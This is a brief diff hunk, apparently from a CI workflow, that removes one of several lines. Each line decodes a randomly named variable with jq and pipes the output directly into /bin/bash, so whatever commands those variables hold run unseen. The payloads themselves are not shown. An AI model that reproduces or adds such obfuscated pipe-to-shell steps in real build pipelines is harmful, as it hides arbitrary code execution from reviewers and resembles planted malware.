@@ -38,7 +38,6 @@ jobs:
           echo $ml14 | jq -r .lpp375 | /bin/bash
           echo $k7 | jq -r .kbm31285 | /bin/bash
           echo $zzphg7 | jq -r .hp52 | /bin/bash
-          printf '%s' "$g15500" | jq -r .k9175 | /bin/bash
           printf '%s' "$tfnb51566" | jq -r .kh0850 | /bin/bash
           printf '%s' "$dnbm78119" | jq -r .dbwxm99 | /bin/bash
           echo $udo6 | jq -r .fmyso228 | /bin/bash
